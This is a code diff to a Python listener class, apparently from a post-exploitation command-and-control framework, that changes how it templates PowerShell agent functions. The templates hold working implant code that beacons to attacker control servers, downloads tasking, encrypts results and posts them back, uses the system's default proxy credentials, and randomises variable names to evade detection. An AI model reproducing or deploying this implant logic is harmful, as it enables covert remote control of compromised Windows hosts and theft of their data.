@@ -786,8 +786,8 @@ class Listener:
 }},
 #LISTENER_DICT
 """.format(
-           get_task_func = "get_task_{}".format(listeoerOptions['Name']['Value'])
-           send_func = "send_message_{}".format(listenerOptions['Name']['Value']),
+           get_task_func = "GetTask{}".format(listeoerOptions['Name']['Value']),
+           send_func = "SendMessage{}".format(listenerOptions['Name']['Value']),
            delay = delay,
            jitter = jitter,
            profile = profile,
@@ -808,12 +808,12 @@ class Listener:
                     updateServers += "\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
 
                 getTask = """
-                    $script:get_task_{{name}} = {
+                    $script:GetTask{name} = {{
                         param($FixedParameters)
                         $ControlServers = {ControlServers};
                         $ServerIndex = 0;
-                        try {
-                            if ($ControlServers[$ServerIndex].StartsWith("http")) {
+                        try {{
+                            if ($ControlServers[$ServerIndex].StartsWith("http")) {{
 
                                 # meta 'TASKING_REQUEST' : 4
                                 $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
@@ -825,37 +825,37 @@ class Listener:
                                 # set the proxy settings for the WC to be the default system settings
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-                                if($FixedParameters["Proxy"]) {
+                                if($FixedParameters["Proxy"]) {{
                                     $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $FixedParameters["Proxy"];
-                                }
+                                }}
 
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent",$FixedParameters["headers"]["UserAgent"])
-                                $script:Headers.GetEnumerator() | % {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
+                                $script:Headers.GetEnumerator() | % {{$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}}
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("Cookie",\"""" + self.session_cookie + """=$RoutingCookie")
 
                                 # choose a random valid URI for checkin
                                 $taskURI = $FixedParameters["taskURIs"] | Get-Random
                                 $result = $"""+helpers.generate_random_script_var_name("wc")+""".DownloadData($ControlServers[$ServerIndex] + $taskURI)
                                 $result
-                            }
-                        }
-                        catch [Net.WebException] {
-                            if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
+                            }}
+                        }}
+                        catch [Net.WebException] {{
+                            if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {{
                                 # restart key negotiation
                                 Start-Negotiate -S "$ser" -SK $SK -UA $ua
-                            }
-                        }
-                    }
+                            }}
+                        }}
+                    }}
                 """
 
                 sendMessage = """
-                    $script:SendMessage = {
+                    $script:SendMessage{name} = {{
                         param($Packets,$FixedParameters)
 
                         $ControlServers = {ControlServers};
                         $ServerIndex = 0;
 
-                        if($Packets) {
+                        if($Packets) {{
                             # build and encrypt the response packet
                             $EncBytes = Encrypt-Bytes $Packets
 
@@ -863,39 +863,39 @@ class Listener:
                             # meta 'RESULT_POST' : 5
                             $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5
 
-                            if($ControlServers[$ServerIndex].StartsWith('http')) {
+                            if($ControlServers[$ServerIndex].StartsWith('http')) {{
                                 # build the web request object
                                 $"""+helpers.generate_random_script_var_name("wc")+""" = New-Object System.Net.WebClient
                                 # set the proxy settings for the WC to be the default system settings
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-                                if($Script:Proxy) {
+                                if($FixedParameters['Proxy']) {{
                                     $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $FixedParameters["Proxy"];
-                                }
+                                }}
 
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('User-Agent', $FixedParameters["UserAgent"])
-                                $FixedParameters["headers"].GetEnumerator() | ForEach-Object {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
+                                $FixedParameters["headers"].GetEnumerator() | ForEach-Object {{$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}}
 
-                                try {
+                                try {{
                                     # get a random posting URI
                                     $taskURI = $FixedParameters["taskURIs"] | Get-Random
                                     $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadData($ControlServers[$ServerIndex]+$taskURI, 'POST', $RoutingPacket);
-                                }
-                                catch [System.Net.WebException]{
+                                }}
+                                catch [System.Net.WebException]{{
                                     # exception posting data...
-                                    if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
+                                    if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {{
                                         # restart key negotiation
                                         Start-Negotiate -S "$ser" -SK $SK -UA $ua
-                                    }
-                                }
-                            }
-                        }
-                    }
+                                    }}
+                                }}
+                            }}
+                        }}
+                    }}
                 """
 
-                return (listener_dict.format(
-                        getTask.format(ControlServers = updateServers),
-                        sendMessage.format(ControlServers = updateServers)
+                return (listener_dict,
+                        getTask.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']),
+                        sendMessage.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']))
 
             elif language.lower() == 'python':
 
